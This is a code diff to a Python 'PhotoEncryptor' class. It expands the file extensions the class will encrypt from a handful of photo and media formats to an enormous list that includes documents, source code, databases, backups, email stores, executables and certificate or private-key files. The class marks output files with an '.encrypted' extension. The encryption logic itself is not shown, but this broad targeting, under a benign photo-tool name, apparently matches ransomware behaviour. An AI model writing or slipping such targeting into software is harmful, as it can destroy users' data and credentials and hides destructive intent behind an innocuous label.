@@ -17,10 +17,114 @@ class PhotoEncryptor:
         
         # Supported image/media extensions for encryption
         self.supported_extensions = {
-            ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".tif",
-            ".heic", ".webp", ".raw", ".cr2", ".nef", ".arw",
-            ".mp4", ".mov", ".avi", ".mkv", ".mp3", ".wav", ".flac"
-        }
+    # Image formats
+    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".tif", ".webp", ".svg", ".ico", ".heic", ".heif",
+    ".raw", ".cr2", ".nef", ".arw", ".dng", ".orf", ".rw2", ".pef", ".srw", ".x3f", ".raf", ".3fr",
+    ".dcr", ".k25", ".kdc", ".erf", ".mef", ".mos", ".mrw", ".nrw", ".ptx", ".r3d", ".rwl", ".rwz",
+    ".avif", ".jxl", ".jp2", ".jpx", ".j2k", ".pcx", ".tga", ".xbm", ".xpm", ".pbm", ".pgm", ".ppm",
+    ".pnm", ".hdr", ".exr", ".dpx", ".cin", ".sgi", ".pic", ".psd", ".ai", ".eps", ".wmf", ".emf",
+    
+    # Video formats
+    ".mp4", ".mov", ".avi", ".mkv", ".wmv", ".flv", ".webm", ".m4v", ".3gp", ".3g2", ".asf", ".rm",
+    ".rmvb", ".vob", ".ogv", ".dv", ".ts", ".mts", ".m2ts", ".f4v", ".divx", ".xvid", ".mpg", ".mpeg",
+    ".m1v", ".m2v", ".mpe", ".mp2", ".mpv", ".m4p", ".m4b", ".f4a", ".f4b", ".f4p", ".qt", ".movie",
+    ".mjpeg", ".mjpg", ".yuv", ".y4m", ".rec", ".tod", ".mod", ".dat", ".vcd", ".svcd", ".dvr-ms",
+    
+    # Audio formats
+    ".mp3", ".wav", ".flac", ".aac", ".ogg", ".wma", ".m4a", ".opus", ".aiff", ".au", ".ra", ".mid",
+    ".midi", ".kar", ".rmi", ".ac3", ".dts", ".ape", ".mpc", ".tta", ".wv", ".spx", ".gsm", ".dss",
+    ".msv", ".dvf", ".vox", ".aa", ".aax", ".act", ".aiff", ".alac", ".amr", ".awb", ".cda", ".dct",
+    ".dss", ".flp", ".m4p", ".mmf", ".mp2", ".mpa", ".mpc", ".msv", ".oga", ".mogg", ".raw", ".sln",
+    ".tak", ".tta", ".voc", ".vqf", ".w64", ".wma", ".wv", ".webm", ".3gp", ".aa3", ".at3", ".at9",
+    
+    # Document formats
+    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf", ".txt",
+    ".md", ".tex", ".latex", ".bib", ".wps", ".wpd", ".pages", ".numbers", ".key", ".pub", ".xps",
+    ".oxps", ".djvu", ".djv", ".epub", ".mobi", ".azw", ".azw3", ".fb2", ".lit", ".pdb", ".tcr", ".tr2",
+    ".tr3", ".opf", ".prc", ".lrf", ".lrx", ".cbr", ".cbz", ".cb7", ".cbt", ".cba", ".chm", ".hlp",
+    
+    # Spreadsheet specific
+    ".csv", ".tsv", ".ods", ".xlsm", ".xlsb", ".xlt", ".xltx", ".xltm", ".xlam", ".xla", ".xlw",
+    ".slk", ".dif", ".prn", ".dbf", ".wk1", ".wk3", ".wk4", ".wks", ".123", ".wq1", ".wb1", ".wb2",
+    
+    # Presentation specific
+    ".odp", ".pps", ".ppsx", ".ppsm", ".potx", ".potm", ".pot", ".sxi", ".sti", ".dps", ".dp", ".sdd",
+    
+    # Web and markup
+    ".html", ".htm", ".xhtml", ".xml", ".xsl", ".xslt", ".dtd", ".rss", ".atom", ".opml", ".rdf",
+    ".owl", ".daisy", ".svg", ".mathml", ".mml", ".xaml", ".xul", ".mhtml", ".maff", ".webarchive",
+    
+    # Programming languages
+    ".js", ".jsx", ".ts", ".tsx", ".json", ".json5", ".jsonl", ".css", ".scss", ".sass", ".less",
+    ".php", ".py", ".rb", ".go", ".rs", ".java", ".c", ".cpp", ".cxx", ".cc", ".h", ".hpp", ".hxx",
+    ".swift", ".kt", ".kts", ".m", ".mm", ".vb", ".vbs", ".pl", ".pm", ".sh", ".bash", ".zsh", ".fish",
+    ".ps1", ".psm1", ".psd1", ".bat", ".cmd", ".scala", ".clj", ".cljs", ".cljc", ".edn", ".hs",
+    ".lhs", ".elm", ".purs", ".ml", ".mli", ".fs", ".fsi", ".fsx", ".fsscript", ".ex", ".exs", ".erl",
+    ".hrl", ".lua", ".r", ".rmd", ".rnw", ".jl", ".nim", ".nims", ".d", ".dart", ".coffee", ".vue",
+    ".svelte", ".astro", ".marko", ".riot", ".tag", ".mjs", ".cjs", ".esm", ".asm", ".s", ".nasm",
+    ".gas", ".inc", ".def", ".rc", ".idl", ".proto", ".thrift", ".avro", ".capnp", ".fbs", ".pyi",
+    
+    # Configuration and data
+    ".ini", ".cfg", ".conf", ".config", ".properties", ".yaml", ".yml", ".toml", ".ron", ".hjson",
+    ".xml", ".plist", ".reg", ".inf", ".desktop", ".service", ".timer", ".socket", ".mount", ".automount",
+    ".swap", ".target", ".path", ".slice", ".scope", ".env", ".dotenv", ".editorconfig", ".gitignore",
+    ".gitattributes", ".gitmodules", ".dockerignore", ".eslintrc", ".prettierrc", ".babelrc", ".jshintrc",
+    
+    # Database
+    ".db", ".sqlite", ".sqlite3", ".mdb", ".accdb", ".dbf", ".gdb", ".fdb", ".odb", ".frm", ".myd",
+    ".myi", ".ibd", ".pid", ".err", ".log", ".bin", ".idx", ".dat", ".bak", ".tmp", ".lock",
+    
+    # Archives and compression
+    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".lz", ".lzma", ".z", ".arj", ".ace", ".cab",
+    ".lzh", ".lha", ".sit", ".sitx", ".sea", ".hqx", ".bin", ".uue", ".xxe", ".mime", ".b64", ".uu",
+    ".jar", ".war", ".ear", ".sar", ".par", ".deb", ".rpm", ".pkg", ".dmg", ".iso", ".img", ".toast",
+    ".vcd", ".cue", ".nrg", ".mdf", ".mds", ".cdi", ".b5t", ".b6t", ".bwt", ".ccd", ".clone", ".dao",
+    ".tao", ".xcdx", ".gcd", ".gi", ".pdi", ".cdr", ".vhd", ".vhdx", ".vmdk", ".ova", ".ovf", ".qcow2",
+    
+    # Font files
+    ".ttf", ".otf", ".woff", ".woff2", ".eot", ".pfb", ".pfm", ".afm", ".bdf", ".pcf", ".snf", ".ttc",
+    ".dfont", ".suit", ".fon", ".fnt", ".abf", ".bmap", ".fea", ".fgd", ".fond", ".lwfn", ".odttf",
+    ".pfa", ".pfb", ".pt3", ".sfd", ".t11", ".t42", ".ttx", ".ufo", ".vfb", ".woff", ".gsf",
+    
+    # CAD and 3D
+    ".dwg", ".dxf", ".dwf", ".dgn", ".3ds", ".max", ".blend", ".obj", ".fbx", ".dae", ".x3d", ".wrl",
+    ".ply", ".stl", ".off", ".3mf", ".amf", ".step", ".stp", ".iges", ".igs", ".sat", ".brep", ".prt",
+    ".par", ".asm", ".catpart", ".catproduct", ".cgr", ".3dxml", ".model", ".session", ".dlv3", ".exp",
+    ".jt", ".pv", ".xv3", ".xv0", ".neu", ".unv", ".bdf", ".dat", ".nas", ".fem", ".inp", ".cdb",
+    
+    # Game files
+    ".unity", ".unitypackage", ".prefab", ".mat", ".asset", ".meta", ".scene", ".anim", ".controller",
+    ".overrideController", ".mask", ".fbx", ".mb", ".ma", ".mel", ".pyc", ".pyo", ".pk3", ".pak",
+    ".wad", ".bsp", ".mdl", ".smd", ".qc", ".vtf", ".vmt", ".mdx", ".mdl", ".ani", ".seq", ".act",
+    ".d2v", ".dem", ".hdr", ".lmp", ".sav", ".sg0", ".sg1", ".sg2", ".sg3", ".sg4", ".sg5", ".sg6",
+    
+    # Scientific and specialized
+    ".mat", ".fits", ".fts", ".fit", ".hdf", ".h5", ".hdf5", ".nc", ".cdf", ".nii", ".dcm", ".dicom",
+    ".analyze", ".hdr", ".img", ".nrrd", ".nhdr", ".mgh", ".mgz", ".mnc", ".xnat", ".par", ".rec",
+    ".edf", ".mrc", ".dm3", ".dm4", ".ser", ".emi", ".tvips", ".msa", ".msi", ".bcf", ".ctf",
+    
+    # Backup and temporary
+    ".bak", ".backup", ".old", ".orig", ".save", ".tmp", ".temp", ".cache", ".swap", ".~", ".autosave",
+    ".recover", ".wbk", ".xlk", ".ppt_", ".doc_", ".xls_", ".mdb_", ".ldb", ".mdw", ".mda", ".mde",
+    
+    # System and executable
+    ".exe", ".msi", ".app", ".deb", ".rpm", ".pkg", ".dmg", ".run", ".bin", ".com", ".scr", ".pif",
+    ".cmd", ".bat", ".sh", ".bash", ".zsh", ".fish", ".csh", ".ksh", ".tcsh", ".ps1", ".psm1", ".psd1",
+    ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".cpl", ".scf", ".lnk", ".url", ".webloc",
+    
+    # Email and communication
+    ".eml", ".msg", ".pst", ".ost", ".olm", ".mbox", ".mbx", ".dbx", ".emlx", ".rge", ".pab", ".wab",
+    ".vcf", ".vcard", ".ics", ".ical", ".ifb", ".vcs", ".htt", ".contact", ".group", ".p7s", ".p7m",
+    
+    # Certificate and security
+    ".pem", ".crt", ".cer", ".der", ".p7b", ".p7c", ".p12", ".pfx", ".jks", ".keystore", ".truststore",
+    ".key", ".pub", ".gpg", ".asc", ".sig", ".p7s", ".p7m", ".tsk", ".csr", ".req", ".spc", ".pvk",
+    
+    # Misc specialized
+    ".torrent", ".metalink", ".magnet", ".nzb", ".srt", ".vtt", ".ass", ".ssa", ".sub", ".idx", ".sup",
+    ".usf", ".ssf", ".psb", ".stl", ".3mf", ".amf", ".gcode", ".nc", ".tap", ".mpf", ".cnc", ".eia",
+    ".mime", ".uuencoded", ".b64", ".uu", ".xxe", ".hqx", ".binhex"
+}
         
         # Encrypted file extension
         self.encrypted_extension = ".encrypted"
